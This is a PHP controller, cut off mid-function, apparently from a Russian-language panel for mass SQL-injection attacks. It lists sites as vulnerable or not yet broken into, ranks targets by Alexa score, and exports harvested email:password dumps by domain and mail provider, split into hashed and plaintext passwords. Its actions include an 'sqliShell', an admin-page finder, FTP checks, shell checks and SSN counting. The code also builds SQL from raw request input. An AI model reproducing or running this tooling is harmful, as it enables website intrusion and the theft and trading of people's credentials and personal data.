<?php
// visit
ini_set('memory_limit', '5000M');
set_time_limit(0);
ignore_user_abort(true);
error_reporting(0);
class PostsController extends AppController
{
	public $name = 'Post';
	public $uses = array('Filed', 'Post', 'Start', 'Multi');
	public $helpers = array('form', 'html', 'javascript', 'paginator', 'ajax');
	public $components = array('RequestHandler', 'Session', 'Injector', 'Baseauth', 'Googlepr');
	public $paginate = array();

	public function __construct()
	{
		parent::__construct();
		include $_SERVER['DOCUMENT_ROOT'] . '/config.php';
	}

	public function beforeFilter()
	{
		$pp = new DATABASE_CONFIG();
		$this->bdmain = $pp->default['database'];
		$this->Baseauth->allow = array('selfProverka', 'renamename', 'errorFinder', 'multi', 'getcountmail', 'getmailfull', 'psn2', 'getInfo_country', 'rendown2', 'rendown1', 'rendown_one', 'rendown_one2', 'passwordAllsqule', 'getmailfullMulti', 'getinfo_category', 'getInfo_pr', 'getInfo_alexa', 'evaltest', 'admin', 'getorders', 'typecorp_one', 'typecorp_pass', 'mx_check', 'smtp_check', 'hash3', 'testing', 'test', 'mx_check_one', 'sort', 'getInfo_country2', 'abuse', 'thepid', 'pid_stop', 'dumpfile', 'dump_reset', 'dump_count', 'dumpfile2', 'dump_reset2', 'dump_count2', 'cleanmail', 'domens', 'mailinfo2', 'sqliShell', 'ccc', 'getCountOrders', 'count_16', 'count_16_one', 'postinfo', 'add_cron', 'optimize', 'repaire', 'dumping_one', 'check_domens', 'check_pr_domen', 'check_alexa_domen', 'check_country_domen', 'find_domen_sqli', 'check_posts', 'findadmin', 'findfiles', 'checkftp', 'count_new', 'evalpredtest', 'ku', 'getcountmailMSSQL', 'saltAllsqule', 'nameAllsqule', 'getCountOrdersMSSQL', 'getCountSsn', 'getCountSsnMSSQL', 'dumping_one_filed_name', 'phoneAllsqule', 'loginAllsqule', 'getToAll', 'add_all_to_posts', 'post_input', 'crowler', 'check_posts_all_to_post', 'chengetable_one_orders', 'multi_all', 'errorFinder_all', 'ssn_16', 'badcheksshells', 'checkblackshells');
	}

	public function afterFilter()
	{
		$urls = $this->Session->read('urls');

		if (isset($this->mysqlInj)) {
			if (count($urls) == 0) {
				$this->Session->write('urls', $this->mysqlInj->urls);
				return;
			}


			$urls = @array_merge($this->mysqlInj->urls, $urls);
			$this->Session->write('urls', $urls);
			return;
		}


		if (count($urls) == 0) {
			$urls = array();
		}

	}

	public function beforeRender()
	{
		$urls = $this->Session->read('urls');
		$this->set('urls', $urls);
		$this->set('field', $this->Session->read('field'));
		$this->set('table', $this->Session->read('table'));
		$posts_all = $this->Post->query('SELECT count(*) FROM `posts_all` ');
		$this->set('posts_all', $posts_all[0][0]['count(*)']);
		$posts_all_check = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `check_posts` =1 ');
		$this->set('posts_all_check', $posts_all_check[0][0]['count(*)']);
		$shlak_domens111 = $this->Post->query('SELECT count(*) FROM `domens` WHERE `status`=1 or `bad`=1 ');
		$this->set('shlak_domens', $shlak_domens111[0][0]['count(*)']);
		$shlak_domens1110 = $this->Post->query('SELECT count(*) FROM `domens` WHERE `status` !=0 AND  `status` !=1 AND `bad` !=1');
		$this->set('domens10', $shlak_domens1110[0][0]['count(*)']);
		$shlak_domens1111 = $this->Post->query('SELECT count(*) FROM `domens` WHERE `status` =1   or `bad` =1');
		$this->set('domens11', $shlak_domens1111[0][0]['count(*)']);
		$shlak_domens11112 = $this->Post->query('SELECT count(*) FROM `posts_all` WHERE `status`=2 or `status`=3 ');
		$this->set('domens_links', $shlak_domens11112[0][0]['count(*)']);
		$usp = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp.txt');
		if ((strlen($usp) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp.txt'))) {
			$usp = '0 шт';
		}


		$this->set('usp', $usp);
		$usp22 = $this->Post->query('SELECT count(*) as `count` FROM ' . "\t" . '`posts` WHERE `status`=2 and `prohod` =5');
		$tmp22 = $usp22[0][0]['count'];
		$this->set('usp22', $tmp22);
		$usp2 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp2.txt');
		if ((strlen($usp2) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp2.txt'))) {
			$usp2 = '0 шт';
		}


		$this->set('usp2', $usp2);
		$usp3 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp3.txt');
		if ((strlen($usp3) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp3.txt'))) {
			$usp3 = '0 шт';
		}


		$this->set('usp3', $usp3);
		$usp4 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp4.txt');
		if ((strlen($usp4) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp4.txt'))) {
			$usp4 = '0 шт';
		}


		$this->set('usp4', $usp4);
		$usp44 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp44.txt');
		if ((strlen($usp44) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp44.txt'))) {
			$usp44 = '0 шт';
		}


		$this->set('usp44', $usp44);
		$mat = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/mat.txt');
		if ((strlen($mat) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/mat.txt'))) {
			$mat = '0 шт';
		}


		$this->set('mat', $mat);
		$shlak = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shlak.txt');
		if ((strlen($shlak) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shlak.txt'))) {
			$shlak = '0 шт';
		}


		$this->set('shlak', $shlak);
		$shlak2 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shlak2.txt');
		if ((strlen($shlak2) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shlak2.txt'))) {
			$shlak2 = '0 шт';
		}


		$this->set('shlak2', $shlak2);
		$data = $this->Session->read('inject');

		if (!(empty($data))) {
			$data['bd'] = array('ss', 'vv', 'ff');
			$this->set('inject', $data);
		}


		if ($this->RequestHandler->isAjax() == true) {
			$this->layout = false;
		}

	}

	public function down_test()
	{
		$data0 = $this->Filed->query('SELECT url FROM `posts` WHERE `status` =3 AND version !=\'\'');
		$c0 = $this->Filed->query('SELECT count(*) FROM `posts` WHERE `status` =3 AND version !=\'\'');

		foreach ($data0 as $d ) {
			$z0 .= $d['posts']['url'];
			$z0 .= "\r\n";
		}

		$count = $c0[0][0]['count(*)'];
		$str = $z0;
		$all = 'Уязвимые';
		header('Content-type: application/txt');
		header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
		echo $z0;
		exit();
	}

	public function down_test_priv()
	{
		$data0 = $this->Filed->query('SELECT url FROM `posts` WHERE `status` =3 AND version !=\'\' AND `file_priv`=1');
		$c0 = $this->Filed->query('SELECT count(*) FROM `posts` WHERE `status` =3 AND version !=\'\'');

		foreach ($data0 as $d ) {
			$z0 .= $d['posts']['url'];
			$z0 .= "\r\n";
		}

		$count = $c0[0][0]['count(*)'];
		$str = $z0;
		$all = 'Уязвимые';
		header('Content-type: application/txt');
		header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
		echo $z0;
		exit();
	}

	public function down_head_test()
	{
		$data0 = $this->Filed->query('SELECT url FROM `posts` WHERE `status` =2 AND (  find =\'cookies\' or find =\'referer\' or find =\'post\' or find =\'useragent\'  or find =\'forwarder\')');

		foreach ($data0 as $d ) {
			$z0 .= $d['posts']['url'];
			$z0 .= "\r\n";
		}

		$str = $z0;
		$all = 'Потенциально уязвимые HEAD';
		header('Content-type: application/txt');
		header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
		echo $z0;
		exit();
	}

	public function down_multi()
	{
		$data0 = $this->Filed->query('SELECT url FROM `posts` WHERE `status` =2 AND version =\'\' AND prohod=5');

		foreach ($data0 as $d ) {
			$z0 .= $d['posts']['url'];
			$z0 .= "\r\n";
		}

		$str = $z0;
		$all = 'УязвимыеНОневскрытые';
		header('Content-type: application/txt');
		header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
		echo $z0;
		exit();
	}

	public function down_multi_top()
	{
		$data0 = $this->Filed->query('SELECT url FROM `posts` WHERE `status` =2 AND version =\'\' AND `prohod`=5 AND `alexa` < 50000');

		foreach ($data0 as $d ) {
			$z0 .= $d['posts']['url'];
			$z0 .= "\r\n";
		}

		$str = $z0;
		$all = 'ТОПНЕВСКРЫТЫЕ';
		header('Content-type: application/txt');
		header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
		echo $z0;
		exit();
	}

	public function squleview()
	{
		$this->s();
		$data = $this->Post->query('SELECT * FROM  `fileds` WHERE post_id !=\' \' group by post_id order by count');
		$p = array();
		$i = 1;

		foreach ($data as $d ) {
			$p[$i]['squle_post'] = $d['fileds']['post_id'];
			$p[$i]['squle_fileds'] = $d['fileds']['id'];
			$g = $this->Post->query('SELECT * FROM  `posts` WHERE id=' . $p[$i]['squle_post']);
			$g2 = $this->Post->query('SELECT * FROM  `fileds` WHERE post_id=\'' . $p[$i]['squle_post'] . '\'');

			foreach ($g2 as $g23 ) {
				$p[$i]['table'][] = $g23['fileds']['table'];
				$p[$i]['label'][] = $g23['fileds']['label'];
				$p[$i]['lastlimit'][] = $g23['fileds']['lastlimit'];
				$p[$i]['count'][] = $g23['fileds']['count'];
				$p[$i]['password'][] = $g23['fileds']['password'];
				$p[$i]['get'][] = $g23['fileds']['get'];
				$p[$i]['dok'][] = $g23['fileds']['dok'];
			}

			$p[$i]['url'] = $g[0]['posts']['url'];
			++$i;
		}

		$this->set('data', $p);
	}

	public function rendview()
	{
		if ($this->params['form']['update']) {
			$domen = $this->params['form']['domen'];
			$category = $this->params['form']['category'];
			$this->Post->query('UPDATE  `renders` SET  `category` = \'' . $category . '\' WHERE  `domen` =\'' . $domen . '\'');
		}


		if ($this->params['isAjax'] == 1) {
			$domen = trim($this->params['pass'][0]);
			$this->Filed->query('DELETE FROM `renders` WHERE domen = \'' . $domen . '\'');
			exit();
		}


		if ($this->params['pass'][0] == 'id') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER BY id DESC');
		}
		 else if ($this->params['pass'][0] == 'countMail') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by countMail DESC');
		}
		 else if ($this->params['pass'][0] == 'countPass') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by countPass DESC');
		}
		 else if ($this->params['pass'][0] == 'countNoHash') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by countNoHash DESC');
		}
		 else if ($this->params['pass'][0] == 'countHash') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by countHash DESC');
		}
		 else if ($this->params['pass'][0] == 'date') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by date DESC');
		}
		 else if ($this->params['pass'][0] == 'category') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by category');
		}
		 else if ($this->params['pass'][0] == 'country') {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by country ');
		}
		 else {
			$data = $this->Filed->query('SELECT * FROM  `renders` ORDER by category');
		}

		$this->set('data', $data);
	}

	public function rendview2()
	{
		if ($this->params['form']['update']) {
			$domen = $this->params['form']['domen'];
			$category = $this->params['form']['category'];
			$this->Post->query('UPDATE  `renders_one` SET  `category` = \'' . $category . '\' WHERE  `domen` =\'' . $domen . '\'');
		}


		if ($this->params['isAjax'] == 1) {
			$domen = trim($this->params['pass'][0]);
			$this->Filed->query('DELETE FROM `renders_one` WHERE domen = \'' . $domen . '\'');

			if ($this->Filed->query('DELETE FROM `mails_one` WHERE domen = \'' . $domen . '\'')) {
				echo 'Удален';
			}


			exit();
		}


		if ($this->params['pass'][0] == 'id') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER BY id DESC');
		}
		 else if ($this->params['pass'][0] == 'countMail') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by countMail DESC');
		}
		 else if ($this->params['pass'][0] == 'countPass') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by countPass DESC');
		}
		 else if ($this->params['pass'][0] == 'countNoHash') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by countNoHash DESC');
		}
		 else if ($this->params['pass'][0] == 'countHash') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by countHash DESC');
		}
		 else if ($this->params['pass'][0] == 'date') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by date DESC');
		}
		 else if ($this->params['pass'][0] == 'category') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by category');
		}
		 else if ($this->params['pass'][0] == 'country') {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by country ');
		}
		 else {
			$data = $this->Filed->query('SELECT * FROM  `renders_one` ORDER by category');
		}

		$this->set('data', $data);
	}

	public function databases()
	{
		$data = $this->paginate('Filed');
		$this->set('data', $data);
	}

	public function domens_old()
	{
		if ($this->params['isAjax'] == 1) {
			$domen = $this->params['pass'][0];
			exit();
		}


		if ($this->params['form']['dateselect'] != '') {
			$sdate = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			$data = $this->Filed->query('SELECT domen FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' GROUP BY domen order by count(domen) DESC limit 50');
			$p = array();

			foreach ($data as $d ) {
				$z = $d['mails']['domen'];
				$p[$z][] = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $z . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
				$p[$z][] = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE domen = \'' . $z . '\' AND pass =\'0\' ');
				$p[$z][] = $this->Filed->query('SELECT pass FROM  `mails` WHERE domen = \'' . $z . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' order by rand() limit 3');
				$p['sdate'] = $this->Filed->query('SELECT date FROM  `mails` group by date ');
				$p['podate'] = $this->Filed->query('SELECT date FROM  `mails` group by date DESC');
				$p['sdate1'] = $sdate;
				$p['podate1'] = $podate;
				$p['sdate1_one'] = $sdate_one;
				$p['podate1_one'] = $podate_one;
				$p[$z]['country'] = $this->Filed->query('SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $z . '%\' limit 0,1) limit 0,1');
				$p[$z]['category'] = $this->Filed->query('SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $z . '%\' limit 0,1) limit 0,1');
			}

			$this->set('data', $p);
			return;
		}


		if ($this->params['form']['down'] != '') {
			$sdate = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			$domen = $this->params['form']['domen'];
			$str = '123';

			if (isset($podate) && ($podate != '')) {
				$data0 = $this->Filed->query('SELECT zona,email,pass,hashtype FROM  `mails` WHERE domen = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype =\'0\'');
			}
			 else {
				$data0 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $domen . '\' AND pass !=\'0\' AND hashtype =\'0\'');
			}

			$z0 = '';

			foreach ($data0 as $d ) {
				$z0 .= $d['mails']['email'];
				$z0 .= ':';
				$z0 .= $d['mails']['pass'];
				$z0 .= "\r\n";
			}

			if (isset($podate) && ($podate != '')) {
				$data1 = $this->Filed->query('SELECT zona,email,pass,hashtype FROM  `mails` WHERE domen = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\' AND hashtype !=\'0\'');
			}
			 else {
				$data1 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $domen . '\' AND pass !=\'0\' AND hashtype !=\'0\'');
			}

			$z1 = '';

			foreach ($data1 as $d ) {
				$z1 .= $d['mails']['email'];
				$z1 .= ':';
				$z1 .= $d['mails']['pass'];
				$z1 .= "\r\n";
			}

			if (isset($podate) && ($podate != '')) {
				$data2 = $this->Filed->query('SELECT zona,email,pass,hashtype FROM  `mails` WHERE domen = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass =\'0\'');
			}
			 else {
				$data2 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = \'' . $domen . '\' AND pass =\'0\'');
			}

			$z2 = '';

			foreach ($data2 as $d2 ) {
				$z2 .= $d2['mails']['email'];
				$z2 .= "\r\n";
			}

			$p['country'] = $this->Filed->query('SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $domen . '%\' limit 0,1) limit 0,1');
			$p['category'] = $this->Filed->query('SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $domen . '%\' limit 0,1) limit 0,1');
			$category = $p['category'][0]['fileds']['category'];
			$country = $p['country'][0]['fileds']['country'];

			if (isset($podate) && ($podate != '')) {
				$count = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\'');
				$count = $count[0][0]['count(*)'];
			}
			 else {
				$count = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\' AND pass !=\'0\'');
				$count = $count[0][0]['count(*)'];
			}

			if (isset($podate) && ($podate != '')) {
				$count2 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
				$count2 = $count2[0][0]['count(*)'];
			}
			 else {
				$count2 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $domen . '\'');
				$count2 = $count2[0][0]['count(*)'];
			}

			$all = '';
			$str = $z0 . $z1 . $z2;
			$counthash = $data = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE domen = \'' . $domen . '\' AND hashtype !=\'0\' AND pass !=\'0\'');
			$hashtype = $counthash[0][0]['count(pass)'];
			$counthash2 = $data = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE domen = \'' . $domen . '\' AND hashtype =\'0\' AND pass !=\'0\'');
			$hashtype2 = $counthash2[0][0]['count(pass)'];
			$all .= $domen;

			if (1 <= $count) {
				$all .= '//ALLcountPASS_' . $count;
			}


			if (1 <= $hashtype) {
				$all .= '//PASShash_' . $hashtype;
			}


			if (1 <= $hashtype) {
				$all .= '//PASSnoHASH_' . $hashtype2;
			}


			if (1 <= $count2) {
				$all .= '//ALLcountEMAILS_' . $count2;
			}


			if (isset($category)) {
				$all .= '//category_' . $category;
			}


			if (isset($country)) {
				$all .= '//country_' . $country;
			}


			header('Content-type: application/txt');
			header('Content-Disposition: attachment; filename=\'' . $all . '.txt\'');
			echo $str;
			return;
		}


		$data = $this->Filed->query('SELECT domen FROM  `mails` GROUP BY domen order by count(domen) DESC limit 50');
		$p = array();

		foreach ($data as $d ) {
			$z = $d['mails']['domen'];
			$p[$z][] = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE domen = \'' . $z . '\'');
			$p[$z][] = $this->Filed->query('SELECT pass FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' order by rand() limit 3');
			$p[$z]['nohash'] = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype =\'0\'');
			$p[$z]['hash'] = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE domen = \'' . $z . '\' AND pass !=\'0\' AND hashtype !=\'0\'');
			$p['sdate'] = $this->Filed->query('SELECT date FROM  `mails` group by date ');
			$p['podate'] = $this->Filed->query('SELECT date FROM  `mails` group by date DESC');
			$p[$z]['country'] = $this->Filed->query('SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $z . '%\' limit 0,1) limit 0,1');
			$p[$z]['category'] = $this->Filed->query('SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like \'%' . $z . '%\' limit 0,1) limit 0,1');
		}

		$this->set('data', $p);
	}

	public function domens2_old()
	{
		if ($this->params['isAjax'] == 1) {
			$z = $this->params['pass'][0];
			exit();
			$p[$z][] = $this->Filed->query('SELECT  count(*) email FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND email LIKE  \'%@' . $z . '\' ');
		}


		if ($this->params['form']['countdelete'] != '') {
			$count = $this->params['form']['countdelete'];
			$data = $this->Filed->query('SELECT meiler FROM  `mails` GROUP BY meiler order by count(meiler) DESC limit 50');

			foreach ($data as $d ) {
				$z = $d['mails']['meiler'];
				$z = trim($z);
				$c = $this->Filed->query('SELECT  count(meiler)  FROM  `mails`  WHERE meiler = \'' . $z . '\' ');
				$c2 = $c[0][0]['count(meiler'];

				if ($c2 <= $count) {
					echo 'domen ' . $z . ', count' . $c2 . ' <br>';
				}
				 else {
					continue;
				}
			}

			$this->redirect(array('action' => 'domens2'));
		}


		if ($this->params['form']['dateselect'] != '') {
			$sdate = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			$data = $this->Filed->query('SELECT meiler FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' GROUP BY meiler order by count(meiler) DESC limit 50');
			$p = array();
			$p['sdate1'] = $sdate;
			$p['podate1'] = $podate;
			$p['sdate'] = $this->Filed->query('SELECT date FROM  `mails` group by date ');
			$p['podate'] = $this->Filed->query('SELECT date FROM  `mails` group by date DESC');

			foreach ($data as $d ) {
				$z = $d['mails']['meiler'];
				$z = trim($z);
				$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' ');
				$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\' AND hashtype != \'0\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
				$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\' AND hashtype = \'0\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
				$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
			}

			$this->set('data', $p);
			return;
		}


		if ($this->params['form']['down'] != '') {
			$sdate = $this->params['form']['sdate'];
			$podate = $this->params['form']['podate'];
			$domen = $this->params['form']['domen'];

			if (isset($podate) && ($podate != '')) {
				if ($this->params['form']['down'] == 'down pass') {
					$data = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler = \'' . $domen . '\' AND pass !=\'0\'');
				}
				 else if ($this->params['form']['down'] == 'down hash') {
					$data = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler = \'' . $domen . '\'  AND  hashtype != \'0\' AND pass !=\'0\'');
				}
				 else if ($this->params['form']['down'] == 'down open') {
					$data = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler = \'' . $domen . '\'  AND hashtype = \'0\' AND pass !=\'0\'');
				}
				 else if ($this->params['form']['down'] == 'down emails') {
					$data = $this->Filed->query('SELECT * FROM  `mails` WHERE date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND meiler = \'' . $domen . '\' ');
				}

			}
			 else if ($this->params['form']['down'] == 'down pass') {
				$data = $this->Filed->query('SELECT * FROM  `mails` WHERE meiler = \'' . $domen . '\'  AND pass !=\'0\'');
			}
			 else if ($this->params['form']['down'] == 'down hash') {
				$data = $this->Filed->query('SELECT * FROM  `mails` WHERE meiler = \'' . $domen . '\'  AND  hashtype != \'0\' AND pass !=\'0\'');
			}
			 else if ($this->params['form']['down'] == 'down open') {
				$data = $this->Filed->query('SELECT * FROM  `mails` WHERE meiler = \'' . $domen . '\'  AND hashtype = \'0\' AND pass !=\'0\'');
			}
			 else if ($this->params['form']['down'] == 'down emails') {
				$data = $this->Filed->query('SELECT * FROM  `mails` WHERE meiler = \'' . $domen . '\'');
			}


			$z = '';

			foreach ($data as $d ) {
				$z .= $d['mails']['email'];

				if (($d['mails']['pass'] != '') && ($d['mails']['pass'] != '0') && ($this->params['form']['down'] != 'down emails')) {
					$z .= ':';
					$z .= $d['mails']['pass'];
				}


				$z .= "\r\n";

				if ($d['mails']['hashtype'] != '0') {
					$hashtype = $d['mails']['hashtype'];
				}

			}

			if (isset($podate) && ($podate != '')) {
				if ($this->params['form']['down'] == 'down pass') {
					$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND pass !=\'0\'');
				}
				 else if ($this->params['form']['down'] == 'down hash') {
					$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND  hashtype != \'0\' AND pass !=\'0\'');
				}
				 else if ($this->params['form']['down'] == 'down open') {
					$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\' AND hashtype = \'0\' AND pass !=\'0\'');
				}
				 else if ($this->params['form']['down'] == 'down emails') {
					$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $domen . '\' AND date >= \'' . $sdate . '\' AND date <= \'' . $podate . '\'');
				}

			}
			 else if ($this->params['form']['down'] == 'down pass') {
				$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $domen . '\' AND pass !=\'0\'');
			}
			 else if ($this->params['form']['down'] == 'down hash') {
				$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $domen . '\' AND  hashtype != \'0\' AND pass !=\'0\'');
			}
			 else if ($this->params['form']['down'] == 'down open') {
				$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $domen . '\' AND hashtype = \'0\' AND pass !=\'0\'');
			}
			 else if ($this->params['form']['down'] == 'down emails') {
				$count = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE  meiler = \'' . $domen . '\'');
			}


			$domen = $domen . '_count_' . $count[0][0]['count(meiler)'];

			if (isset($hashtype)) {
				$domen .= '_hash_' . $hashtype;
			}


			header('Content-type: application/txt');
			header('Content-Disposition: attachment; filename=\'' . $domen . '.txt\'');
			echo $z;
			return;
		}


		$data = $this->Filed->query('SELECT meiler FROM  `mails` GROUP BY meiler order by count(meiler) DESC limit 10');
		$p = array();
		$p['sdate'] = $this->Filed->query('SELECT date FROM  `mails` group by date ');
		$p['podate'] = $this->Filed->query('SELECT date FROM  `mails` group by date DESC');

		foreach ($data as $d ) {
			$z = $d['mails']['meiler'];
			$z = trim($z);
			$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\' AND pass !=\'0\' ');
			$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\' AND hashtype != \'0\' AND pass !=\'0\' ');
			$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\' AND hashtype = \'0\' AND pass !=\'0\'');
			$p[$z][] = $this->Filed->query('SELECT  count(meiler)  FROM  `mails` WHERE meiler = \'' . $z . '\'');
		}

		$this->set('data', $p);
	}

	public function dump_reset()
	{
		$this->Post->query('UPDATE  `mails` SET  `down` = 0 WHERE  `down` =1');
	}

	public function dump_count()
	{
		$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `down`=1 ');
		$this->d($c0);
	}

	public function dumpfile()
	{
		$this->timeStart = $this->start('dumpfile', 1);
		$p['sdate'] = $this->Post->query('SELECT date FROM  `mails` WHERE `down`=0 group by date ');

		foreach ($p['sdate'] as $ku ) {
			$this->d($ku['mails']['date']);
			$date_one = $ku['mails']['date'];
			$date_one = trim($date_one);
			$rr = rand(1, 9999);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data', 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one, 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/corp', 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/big', 511);
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/data/' . $date_one . '/sred', 511);
			$data0 = $this->Filed->query('SELECT * FROM  `mails` WHERE `down`=0 AND date = \'' . $date_one . '\' AND type=\'big\' AND pass !=\'0\' AND hashtype =\'0\' LIMIT 100000');
			$c0 = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `down`=0  AND date = \'' . $date_one . '\' AND type=\'big\' AND pass !=\'0\' AND hashtype =\'0\' LIMIT 100000');
			$this->d($c0, 'bigNoHash');

			foreach ($data0 as $d ) {
				$mmm = $d['mails']['id'];
